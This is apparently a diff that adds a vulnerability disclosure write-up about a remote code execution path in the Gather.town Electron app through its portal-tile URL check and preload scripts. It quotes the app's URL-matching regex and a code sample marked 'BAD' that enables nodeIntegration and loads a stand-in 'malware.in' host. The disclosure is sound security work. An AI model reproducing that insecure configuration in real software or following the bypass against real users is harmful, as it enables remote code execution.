+<h2 id="technical-severity-vrt-category" style="position:relative;"><a href="#technical-severity-vrt-category" aria-label="technical severity vrt category permalink" class="anchor before"><svg aria-hidden="true" focusable="false" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>Technical Severity (VRT category)</h2>
+<ul>
+<li>P1 — Server-Side Injection > Remote Code Execution (RCE)</li>
+</ul>
+<h2 id="vulnerability-details" style="position:relative;"><a href="#vulnerability-details" aria-label="vulnerability details permalink" class="anchor before"><svg aria-hidden="true" focusable="false" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>Vulnerability details</h2>
+<p><span
+      class="gatsby-resp-image-wrapper"
+      style="position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; "
+    >
+      <span
+    class="gatsby-resp-image-background-image"
+    style="padding-bottom: 50%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAKCAYAAAC0VX7mAAAACXBIWXMAAAsTAAALEwEAmpwYAAADK0lEQVQozzWPe0xTBxyFf6jZdDKmmAgsLtlmQsCYgKhIsBjEMsctr9KWQtFyqeUSwShaec6Oh46CsoFCfCCiovFRMIoF2wsIJaRxbka0IlLUgW5ZHAsbtMKYtJylMTt/nJy/vnyHaCUR+RB9SEvp/ywkIv/VwRS5VSFPSeDuKZNzTJy68A6zPcUay0gcIkY6ulOxl0+MUZm2CVX968MVOvU3/cRbQEQg8iUhedAizvODj4xfrvLu9Fy0uJ2IgkVbWA3H5CIr4QAkEg4yaRYkiRzkkt1QSHOwR1wISZIGGzYrLa2DIADvjdzDe4nP0Kef+CHgM0987uWNpV7L66XhBXu00RUoZqpm02S7nCwrd4mTds6zKplrR5zaeTRK92+8MBuBIeJOWdPIe6C7AmjNAi/f5Y8+/mI1PPyjZj2W+YB8A+oi4k9V54mPIV9R906cXuJKS892ySRqV2ryDldKfKZLl1T7ThKXhxAB2+2+Ogd4UFf/BFltDrdoBC1coFwVWnjGLzCjdYV/CSeIzD/Jxu4CK+IQL8sEk56BbawUsYpUSBOUUMVxYES5CN6k7Pl1GnTh1gBRz48zfpaHjkgAQV1jCNl7GgVFLdBW3sahIzW9V85WNA83f3/T2nBR/+R40/VhzeGrz/frLtryy5oHq0sN1u+Oto0cqeloHf0Tgp7H88tocGTG8tsbF3oto8gp6kDZCfM/uVU3Z3TnDDO/TzinX4zPTd02W+3VtU324qJjjt15+rcNbb+8vXpv0l54rs1eVnV4qr6p0W5+PIiBl5ON9HRk+sXEFNBwnp8LXi90hid+iwihCily1fyz0cn5h0N/YGNYEjZFpSL0KzUEghhU1DTjUGUXwr6WYq1oA7ZL1zmLy+X42fbG4Aa+dgPrTrUgMHAzohP3IZrhwKry8WzsLwwMjyNoXQzCtiqwkcnBlsgMaKvakba/G9qDZ1BaroWxsQxjXSfx0/C4kR48cWiev3KabxjuGzUFlSa9vpe/fO0uf7m1jx+w/W16MDRhyj5Qyxfk/cCXauv5rOxyXm/o489eMphaGmp5W1+b6X77dWOv4Za5w/JK/h/kbq70/RdwJwAAAABJRU5ErkJggg=='); background-size: cover; display: block;"
+  ></span>
+  <img
+        class="gatsby-resp-image-image"
+        alt="Gather.town Portal Feature"
+        title="Gather.town Portal Feature"
+        src="/static/6cc9ef43657ad061080db16499d8ed50/37523/gather-town-po.png"
+        srcset="/static/6cc9ef43657ad061080db16499d8ed50/e9ff0/gather-town-po.png 180w,
+/static/6cc9ef43657ad061080db16499d8ed50/f21e7/gather-town-po.png 360w,
+/static/6cc9ef43657ad061080db16499d8ed50/37523/gather-town-po.png 720w,
+/static/6cc9ef43657ad061080db16499d8ed50/302a4/gather-town-po.png 1080w,
+/static/6cc9ef43657ad061080db16499d8ed50/07a9c/gather-town-po.png 1440w,
+/static/6cc9ef43657ad061080db16499d8ed50/d698c/gather-town-po.png 1846w"
+        sizes="(max-width: 720px) 100vw, 720px"
+        style="width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;"
+        loading="lazy"
+        decoding="async"
+      />
+    </span></p>
+<h3 id="gathertown-has-a-portal-function" style="position:relative;"><a href="#gathertown-has-a-portal-function" aria-label="gathertown has a portal function permalink" class="anchor before"><svg aria-hidden="true" focusable="false" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>Gather.town has a portal function.</h3>
+<p>If you use the portal function, you can move to another space within the “gather.town” domain and it will be redirected to the <sub>.gather.town domain. This function is mainly used when moving to another place inside the Space.
+what if? Can I use the redirect function of this portal function to induce RCE? Let’s check it out.</p>
+<p><strong>URL / Location of vulnerability (optional)</strong></p>
+<ul>
+<li>mapMaker URL, Electron Based Application in the portal to space</li>
+</ul>
+<div class="gatsby-highlight" data-language="text"><pre class="language-text"><code class="language-text">    &lt;https://gather.town/mapmaker/>&lt;spaceID>/&lt;spaceName>
+    &lt;https://gather.town/spaceID/app/>&lt;spaceID>/&lt;spaceName></code></pre></div>
+<ul>
+<li>Electron Application Preload Script runs outside the Sandbox and starts before the Render Script is loaded, and these functions have access to application data structures that can be isolated or released from isolation in the Electron Sandbox.</li>
+<li>In Gather.town, the Preload Script was exported from the application program to the Global Window.</li>
+<li>preload (String-optional)</li>
+<li>Specifies a script that will be loaded before other scripts run in the page.</li>
+<li>This Scripts will always have access to node APIs no matter whether node integration is turned on or off.</li>
+<li>The Value should be the absolute file path to the script.</li>
+<li>When node integration is turned off, the preload script can reintroduce Node global symbols back to the golbal scope.</li>
+</ul>
+<p><span
+      class="gatsby-resp-image-wrapper"
+      style="position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; "
+    >
+      <span
+    class="gatsby-resp-image-background-image"
+    style="padding-bottom: 32.22222222222222%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAGCAIAAABM9SnKAAAACXBIWXMAAAsTAAALEwEAmpwYAAABRElEQVQY0y3CuS5EURgA4PsGojAz7oxzF/ee5f/P/c82Y6cQJLZWp9WLxpKMoNVJ8AQiJPSUPIJqXkEiUUiIxEjEly9aXVjqSK9HzdBQOTCY1+oyHlGAwfnZjmlPmOCqYOwUYEcKEsJyYTk3RUkZp+ise3SytXe4c3C83+1u7yJM15tCYVvTJKF32lXoKpoA8CCNlFZKK4Qpucm5id56va/Pj37/p//T/359X1/dHG5yjiYrBGMpS/6yNGFpkmT/04yleZYX0e35xeP1/cvT893Vw+XpzViYb8RF5cedH0e0oAPqALotMXBlhTJSklLEOXIB0drcUqjNZXGoN6ERq8YwskyDNkqAAgKwAFahFWC5rEqBUiJCpaQWXEUbi8srM+veL7SYazEXt2xeEPkOV5RkpUCj0KA2Cgi1BSSsnCavyQHQLyo4U/8Zm+A+AAAAAElFTkSuQmCC'); background-size: cover; display: block;"
+  ></span>
+  <img
+        class="gatsby-resp-image-image"
+        alt="MapMaker Portal tile Input space to portal to URL Check!"
+        title="MapMaker Portal tile Input space to portal to URL Check!"
+        src="/static/b0fdef04c6d5ef1a15deeb2c38549809/37523/mapMakerPortal.png"
+        srcset="/static/b0fdef04c6d5ef1a15deeb2c38549809/e9ff0/mapMakerPortal.png 180w,
+/static/b0fdef04c6d5ef1a15deeb2c38549809/f21e7/mapMakerPortal.png 360w,
+/static/b0fdef04c6d5ef1a15deeb2c38549809/37523/mapMakerPortal.png 720w,
+/static/b0fdef04c6d5ef1a15deeb2c38549809/302a4/mapMakerPortal.png 1080w,
+/static/b0fdef04c6d5ef1a15deeb2c38549809/2cefc/mapMakerPortal.png 1400w"
+        sizes="(max-width: 720px) 100vw, 720px"
+        style="width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;"
+        loading="lazy"
+        decoding="async"
+      />
+    </span></p>
+<p><span
+      class="gatsby-resp-image-wrapper"
+      style="position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; "
+    >
+      <span
+    class="gatsby-resp-image-background-image"
+    style="padding-bottom: 40.55555555555556%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAICAIAAAB2/0i6AAAACXBIWXMAAAsTAAALEwEAmpwYAAABG0lEQVQY032R646EMAiFfZKNVm2hpVza6qhzye77v9RGZ/7uJl8IkBwOgc6BNKq7biqrUCMQAklnZEIh1L/IqN0EuiRTXlNeMVaMBVJFNEwtxOIDe5AZxF/MIHPgOfAYWFA7jxpRmWotr7L81PYUO6y+zO5UHprXXB505Un3CcSBjCBDYIrlFCdUiLboYe076452z/WFvMLJDWQDWma0Ce10RvPRJhCmpZtRKVofOFHj8oyyxbzMqXpqDtShjqgObbw8z87l3AfJwG+xzrEILVwepDuXg2Tna9uke9IN9cBzYvO0+NR8qi4aoXycs+7Z9sA3B9r7PAAPIC7w4PNZ+twH7q/8zZfP6XNtKo2q5VVSIZB8veF/CLUl+wXuoVQ4hUL0NQAAAABJRU5ErkJggg=='); background-size: cover; display: block;"
+  ></span>
+  <img
+        class="gatsby-resp-image-image"
+        alt="/default/bundle.af951a35e2bd39ac4daf.jsx:5712"
+        title="/default/bundle.af951a35e2bd39ac4daf.jsx:5712"
+        src="/static/d102434e58e42a836870040980758c32/37523/bundle-code1.png"
+        srcset="/static/d102434e58e42a836870040980758c32/e9ff0/bundle-code1.png 180w,
+/static/d102434e58e42a836870040980758c32/f21e7/bundle-code1.png 360w,
+/static/d102434e58e42a836870040980758c32/37523/bundle-code1.png 720w,
+/static/d102434e58e42a836870040980758c32/302a4/bundle-code1.png 1080w,
+/static/d102434e58e42a836870040980758c32/2cefc/bundle-code1.png 1400w"
+        sizes="(max-width: 720px) 100vw, 720px"
+        style="width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;"
+        loading="lazy"
+        decoding="async"
+      />
+    </span></p>
+<ul>
+<li>lib/url.js in <code class="language-text">URL(targetUrl)</code> Node js URL strings and URL objects Parse</li>
+<li>Blacklist (“localhost”, “gather.town”) hostname check for URL return value</li>
+</ul>
+<p><strong>gather town Electron Application Portal Tile Object interaction before URL check logic</strong></p>
+<p><span
+      class="gatsby-resp-image-wrapper"
+      style="position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; "
+    >
+      <span
+    class="gatsby-resp-image-background-image"
+    style="padding-bottom: 21.111111111111114%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAECAIAAAABPYjBAAAACXBIWXMAAAsTAAALEwEAmpwYAAAA/0lEQVQI1wH0AAv/ABgYLgwKEAwLEhAPFBwbHxUVFBUVFh4eIScqLy4tMDQuLTEsKisoKSspKy4pKS4pKC0rLCkpKyIgIi4uMQBNT2RJRFhQTGJJQ1MRDxUUFBMSExIqKy01MzU9PUBCOzo/ODg+OTg7NjY+NzU+NzU9ODc6NTQ2MzI2NTcAxLm2t7S2wb27rqmmdnJtgH51d3FrNC4wMy8xPzxAPzg4PDc6Ozg7NTEzMy8yLysuMistMy0vKSstLS0vAMbGvbrNzbbFxbjJyMLS0sbY2ba3uC4kJyomKiknKyYhJCYhJSchJCgjJiciJiUhJCkiJSoiJRweISUlKPlhPzWGxflkAAAAAElFTkSuQmCC'); background-size: cover; display: block;"
+  ></span>
+  <img
+        class="gatsby-resp-image-image"
+        alt="electron app from gather.town object interaction (Portal)"
+        title="electron app from gather.town object interaction (Portal)"
+        src="/static/a59e3072816b463a117c8d2a26af2b16/37523/electronapp-object.png"
+        srcset="/static/a59e3072816b463a117c8d2a26af2b16/e9ff0/electronapp-object.png 180w,
+/static/a59e3072816b463a117c8d2a26af2b16/f21e7/electronapp-object.png 360w,
+/static/a59e3072816b463a117c8d2a26af2b16/37523/electronapp-object.png 720w,
+/static/a59e3072816b463a117c8d2a26af2b16/302a4/electronapp-object.png 1080w,
+/static/a59e3072816b463a117c8d2a26af2b16/2cefc/electronapp-object.png 1400w"
+        sizes="(max-width: 720px) 100vw, 720px"
+        style="width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;"
+        loading="lazy"
+        decoding="async"
+      />
+    </span></p>
+<ul>
+<li>In Gather Town Electron based Application portal tile interaction to <code class="language-text">enter key</code></li>
+</ul>
+<p><span
+      class="gatsby-resp-image-wrapper"
+      style="position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; "
+    >
+      <span
+    class="gatsby-resp-image-background-image"
+    style="padding-bottom: 31.666666666666664%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAGCAIAAABM9SnKAAAACXBIWXMAAAsTAAALEwEAmpwYAAAAm0lEQVQY042NSwrDMAxEfRknki3J8T8/N+2u9z9RawKlS8NbDDMMT2lka927tOf6umrbw3rm80hHq63lbfXlnyqxSCoSs8SHi0oDIXkfNuLIHNAIAAF2ZujcuZe/fK9IagLipbh0iVtl2SQeSH5CHqGbU95rPQ1HJI/WDT77eULhpdT9xf4I6RRfZuMGUbMRK2FC0UAaaFz7NX8A8j0/UqHjeVAAAAAASUVORK5CYII='); background-size: cover; display: block;"
+  ></span>
+  <img
+        class="gatsby-resp-image-image"
+        alt="/default/bundle.ebbe1909e06faf0f894b.js:18122"
+        title="/default/bundle.ebbe1909e06faf0f894b.js:18122"
+        src="/static/adaa0293896b95f9faee89b88b513e48/37523/bundle-code2.png"
+        srcset="/static/adaa0293896b95f9faee89b88b513e48/e9ff0/bundle-code2.png 180w,
+/static/adaa0293896b95f9faee89b88b513e48/f21e7/bundle-code2.png 360w,
+/static/adaa0293896b95f9faee89b88b513e48/37523/bundle-code2.png 720w,
+/static/adaa0293896b95f9faee89b88b513e48/302a4/bundle-code2.png 1080w,
+/static/adaa0293896b95f9faee89b88b513e48/2cefc/bundle-code2.png 1400w"
+        sizes="(max-width: 720px) 100vw, 720px"
+        style="width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;"
+        loading="lazy"
+        decoding="async"
+      />
+    </span></p>
+<div class="gatsby-highlight" data-language="text"><pre class="language-text"><code class="language-text">    (String(b).match("^\\\\s*(&lt;http://localhost>:|https://([a-zA-Z0-9]+\\\\.)*gather\\\\.town($|/))")
+    
+    1. &lt;http://localhost>:
+    2. https://([a-zA-Z0-9])
+    3. *gather.town</code></pre></div>
+<ul>
+<li>When performing Portal Tile Interaction in Gather.town Electron Application, URL check is performed and is performed using regular expression (String.prototype.match()).</li>
+</ul>
+<h2 id="attack-pointer" style="position:relative;"><a href="#attack-pointer" aria-label="attack pointer permalink" class="anchor before"><svg aria-hidden="true" focusable="false" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>Attack Pointer</h2>
+<ul>
+<li>Input space for portal in mapMaker portal tile feature</li>
+</ul>
+<p><strong>app.asar unpack (main.js:83, interop.js)</strong></p>
+<p><span
+      class="gatsby-resp-image-wrapper"
+      style="position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; "
+    >
+      <span
+    class="gatsby-resp-image-background-image"
+    style="padding-bottom: 51.11111111111111%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAKCAYAAAC0VX7mAAAACXBIWXMAAAsTAAALEwEAmpwYAAAB9UlEQVQoz13SWW7bMBAGYCJoz5FElsVNXESKpNbYjosWzUtQoBc0ckvB5l9YbpumDx9muGBIDElk7RHijOAntGmHtj9ChQO2dcBGOBS8QSlbbHVCZXtUpsfW9Gt+na9UBDXdasMMSMEMuuGIaX5B2r8izS/ox29omhG+GeHSFzTxGbqZUEsPRvU7plFQhcfqHWHMYB+fsOuP6P2EaDp0OiLZiOQGpGaAlg7qSjR/SW7hhAVlGg+VQkH1ilxPuW6uwwQVdxB+BjURlQqgOqLSAVsdUKqAcs3j6rH24Myst/xQkDKTJzfkMe1z58fcmi5bYbPhJlt+jTZLZrL4D2cmO2EzZTo/VCoXVK9Iycw5pd3ZtbuzkP5CK/WxT1SBU/2O3Qh2Wy8qdXms1PkPQqWHiXvU8QCVnmHcuEgdFmn7xZq4KNst4jrWYeF2XEoVllK4peDNUjCzbLjFv4jQceqn73OYvnZ6OP4Urn9jtTtR1Z74lR1OpYonbtKJ6XiitT/Rul3jVjRvtG5fuYkd03HmOk5EmESmww/SdgeipPPez4hhRmwnpHZCbEckP0CoFlXdgqqbSvr1m9xvBK2kI7LpCTeJEK7jXWifPvtSEi3c3JmEsekuU9NdRpvyYGIebcwVvTX/8ebat8vvl3X3pSRb0XxiKtz9ArLGG3w3/vCyAAAAAElFTkSuQmCC'); background-size: cover; display: block;"
+  ></span>
+  <img
+        class="gatsby-resp-image-image"
+        alt="gather.town app asar unpack"
+        title="gather.town app asar unpack"
+        src="/static/8097dbd368b04a42f33941b9e2464679/37523/unpack-01.png"
+        srcset="/static/8097dbd368b04a42f33941b9e2464679/e9ff0/unpack-01.png 180w,
+/static/8097dbd368b04a42f33941b9e2464679/f21e7/unpack-01.png 360w,
+/static/8097dbd368b04a42f33941b9e2464679/37523/unpack-01.png 720w,
+/static/8097dbd368b04a42f33941b9e2464679/302a4/unpack-01.png 1080w,
+/static/8097dbd368b04a42f33941b9e2464679/7c5b4/unpack-01.png 1309w"
+        sizes="(max-width: 720px) 100vw, 720px"
+        style="width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;"
+        loading="lazy"
+        decoding="async"
+      />
+    </span></p>
+<p><strong>Preload scripts can introduce vulnerabilities</strong></p>
+<p>The following is a part of the createWindow function in the main.js code after asar unpacked.</p>
+<p><span
+      class="gatsby-resp-image-wrapper"
+      style="position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; "
+    >
+      <span
+    class="gatsby-resp-image-background-image"
+    style="padding-bottom: 48.888888888888886%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAKCAIAAAA7N+mxAAAACXBIWXMAAAsTAAALEwEAmpwYAAABVklEQVQoz4XRSW7cMBAFUB0mLYlksUhKnEkN1NRwt9FeeOH73yRoBUgcL2zgoVCbj49CVYp3Ux6Xcox5GcctpUHb5FJxcbaxCJ0IyIbiHzXhn1Ug+nm9zevren1fbx/r8RHz3cZN9BE7XxN+aeilZSf4Gm6o8LmEXHw6QnnE5S3MNzdcCXYtk1RYphxBQ4RpefeL8M+qhuI+7y/bY857Tnu0+Zi3dSjZpcmXMe3TdItxDa54HSQopIhUIBNAseIUDz88jvt92Zc4Zzt4YQcdUm+98rH3BgS0wAlwws/kE6fYM1FxJgQIqYNxuXdJ9h6VRWVQGaEsdg6VBWVBGpCGnwtXhkiNICtkAkEKE59Jk1BHJnXNRAPyrxbUOf+pueJMPpsn49d536d1DJNWQVD8EVLUIKua8Ot2XcpL1wWgCJTz86QfMYoVSN27ZOOAfYAuXP5/xvd+A4BldQq2RdQWAAAAAElFTkSuQmCC'); background-size: cover; display: block;"
+  ></span>
+  <img
+        class="gatsby-resp-image-image"
+        alt="gather.town Electron App createWindow"
+        title="gather.town Electron App createWindow"
+        src="/static/3d102600e19e098a7ba4b8d4f47c83b7/37523/createWindow.png"
+        srcset="/static/3d102600e19e098a7ba4b8d4f47c83b7/e9ff0/createWindow.png 180w,
+/static/3d102600e19e098a7ba4b8d4f47c83b7/f21e7/createWindow.png 360w,
+/static/3d102600e19e098a7ba4b8d4f47c83b7/37523/createWindow.png 720w,
+/static/3d102600e19e098a7ba4b8d4f47c83b7/f4281/createWindow.png 1016w"
+        sizes="(max-width: 720px) 100vw, 720px"
+        style="width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;"
+        loading="lazy"
+        decoding="async"
+      />
+    </span></p>
+<ul>
+<li><code class="language-text">Preload</code> scripts are executed outside of the sandbox and are initiated before renderer scripts are loaded.</li>
+<li>These have legitimate uses such as granting access to application data structures that might be isolated or segregated in a sandbox.</li>
+<li>However, this comes with a catch. MVP Teams have demonstrated how isolation can be bypassed using preloads — meaning that insecure code within the sandbox can be executed.</li>
+<li>Preload scripts have access to Node.js, and the functions exported by applications to the global window often include dangerous primitives</li>
+</ul>
+<p><strong>Isolation For Untrusted Content and Remote Code</strong></p>
+<ul>
+<li>When receiving code from an untrusted source (Remote Server)</li>
+<li>Security issues when running code locally</li>
+</ul>
+<p>The following is an example of code that violates the security policy.</p>
+<div class="gatsby-highlight" data-language="text"><pre class="language-text"><code class="language-text">    Node js    -> (Enable) (Remote Code should not be executed.)
+    Local File -> (Node JS enable)
+    Remote Contents  -> &lt;WebView>, BrowserView
+        -> nodeIntegration (disable) 
+        -> contextIsolation (enable)</code></pre></div>
+<p><strong>In Node.js Integration, Remote Content must be disabled.</strong></p>
+<div class="gatsby-highlight" data-language="text"><pre class="language-text"><code class="language-text">    - BrowserWindow
+    - BrowserView
+    - &lt;webview></code></pre></div>
+<ul>
+<li>The following Electron API can use NodeJS when Node.js is activated, so an attack can be executed based on this.</li>
+<li>An XSS attack may be more dangerous if an attacker can execute code in the RenderProcessEscape and the User stage.</li>
+</ul>
+<div class="gatsby-highlight" data-language="tsx"><pre class="language-tsx"><code class="language-tsx">    <span class="token operator">&lt;</span><span class="token operator">!</span><span class="token operator">-</span><span class="token constant">BAD</span><span class="token operator">-</span><span class="token operator">></span>
+    <span class="token keyword">const</span> mainWindow <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">BrowserWindow</span><span class="token punctuation">(</span><span class="token punctuation">{</span>
+      webPreferences<span class="token operator">:</span> <span class="token punctuation">{</span>
+        nodeIntegration<span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>
+        nodeIntegrationInWorker<span class="token operator">:</span> <span class="token boolean">true</span>
+      <span class="token punctuation">}</span>
+    <span class="token punctuation">}</span><span class="token punctuation">)</span>
+    mainWindow<span class="token punctuation">.</span><span class="token function">loadURL</span><span class="token punctuation">(</span><span class="token string">'&lt;https://malware.in>'</span><span class="token punctuation">)</span><span class="token operator">&lt;</span><span class="token operator">!</span><span class="token operator">-</span><span class="token constant">BAD</span><span class="token operator">-</span><span class="token operator">></span>
+    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>webview</span> <span class="token attr-name">nodeIntegration</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>exploit.html<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>webview</span><span class="token punctuation">></span></span></code></pre></div>
+<p><strong>gather.town MapMaker Portal tile Input space to portal to URL Check</strong></p>
+<ul>
+<li>Among the “MapMaker Portal Tile” functions, there is a function that allows you to move to the outside [Gather.town space] using [Portal to other space] rather than the current Room standard.</li>
+</ul>
+<p><span
+      class="gatsby-resp-image-wrapper"
+      style="position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; "
+    >
+      <span
+    class="gatsby-resp-image-background-image"
+    style="padding-bottom: 32.22222222222222%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAGCAIAAABM9SnKAAAACXBIWXMAAAsTAAALEwEAmpwYAAABRElEQVQY0y3CuS5EURgA4PsGojAz7oxzF/ee5f/P/c82Y6cQJLZWp9WLxpKMoNVJ8AQiJPSUPIJqXkEiUUiIxEjEly9aXVjqSK9HzdBQOTCY1+oyHlGAwfnZjmlPmOCqYOwUYEcKEsJyYTk3RUkZp+ise3SytXe4c3C83+1u7yJM15tCYVvTJKF32lXoKpoA8CCNlFZKK4Qpucm5id56va/Pj37/p//T/359X1/dHG5yjiYrBGMpS/6yNGFpkmT/04yleZYX0e35xeP1/cvT893Vw+XpzViYb8RF5cedH0e0oAPqALotMXBlhTJSklLEOXIB0drcUqjNZXGoN6ERq8YwskyDNkqAAgKwAFahFWC5rEqBUiJCpaQWXEUbi8srM+veL7SYazEXt2xeEPkOV5RkpUCj0KA2Cgi1BSSsnCavyQHQLyo4U/8Zm+A+AAAAAElFTkSuQmCC'); background-size: cover; display: block;"
+  ></span>
+  <img
+        class="gatsby-resp-image-image"
+        alt="gather.town url check logic"
+        title="gather.town url check logic"
+        src="/static/b0fdef04c6d5ef1a15deeb2c38549809/37523/gather-url-check.png"
+        srcset="/static/b0fdef04c6d5ef1a15deeb2c38549809/e9ff0/gather-url-check.png 180w,
+/static/b0fdef04c6d5ef1a15deeb2c38549809/f21e7/gather-url-check.png 360w,
+/static/b0fdef04c6d5ef1a15deeb2c38549809/37523/gather-url-check.png 720w,
+/static/b0fdef04c6d5ef1a15deeb2c38549809/302a4/gather-url-check.png 1080w,
+/static/b0fdef04c6d5ef1a15deeb2c38549809/2cefc/gather-url-check.png 1400w"
+        sizes="(max-width: 720px) 100vw, 720px"
+        style="width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;"
+        loading="lazy"
+        decoding="async"
+      />
+    </span></p>
+<ul>
+<li>The following source code is the part of the logic of [Input space to portal] based on the MapMaker function that performs URL-based inspection.</li>
+</ul>
+<p><span
+      class="gatsby-resp-image-wrapper"
+      style="position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; "
+    >
+      <span
+    class="gatsby-resp-image-background-image"
+    style="padding-bottom: 40.55555555555556%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAICAIAAAB2/0i6AAAACXBIWXMAAAsTAAALEwEAmpwYAAABG0lEQVQY032R646EMAiFfZKNVm2hpVza6qhzye77v9RGZ/7uJl8IkBwOgc6BNKq7biqrUCMQAklnZEIh1L/IqN0EuiRTXlNeMVaMBVJFNEwtxOIDe5AZxF/MIHPgOfAYWFA7jxpRmWotr7L81PYUO6y+zO5UHprXXB505Un3CcSBjCBDYIrlFCdUiLboYe076452z/WFvMLJDWQDWma0Ce10RvPRJhCmpZtRKVofOFHj8oyyxbzMqXpqDtShjqgObbw8z87l3AfJwG+xzrEILVwepDuXg2Tna9uke9IN9cBzYvO0+NR8qi4aoXycs+7Z9sA3B9r7PAAPIC7w4PNZ+twH7q/8zZfP6XNtKo2q5VVSIZB8veF/CLUl+wXuoVQ4hUL0NQAAAABJRU5ErkJggg=='); background-size: cover; display: block;"
+  ></span>
+  <img
+        class="gatsby-resp-image-image"
+        alt="/default/bundle.af951a35e2bd39ac4daf.jsx:5712"
+        title="/default/bundle.af951a35e2bd39ac4daf.jsx:5712"
+        src="/static/d102434e58e42a836870040980758c32/37523/bundle-code3.png"
+        srcset="/static/d102434e58e42a836870040980758c32/e9ff0/bundle-code3.png 180w,
+/static/d102434e58e42a836870040980758c32/f21e7/bundle-code3.png 360w,
+/static/d102434e58e42a836870040980758c32/37523/bundle-code3.png 720w,
+/static/d102434e58e42a836870040980758c32/302a4/bundle-code3.png 1080w,
+/static/d102434e58e42a836870040980758c32/2cefc/bundle-code3.png 1400w"
+        sizes="(max-width: 720px) 100vw, 720px"
+        style="width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;"
+        loading="lazy"
+        decoding="async"
+      />
+    </span></p>
+<p>It can be seen that the blacklist-based hostname (localhost, gather.town) inspection method and HTTP security protocol (SSL) inspection are not performed.</p>
+<p><span
+      class="gatsby-resp-image-wrapper"
+      style="position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; "
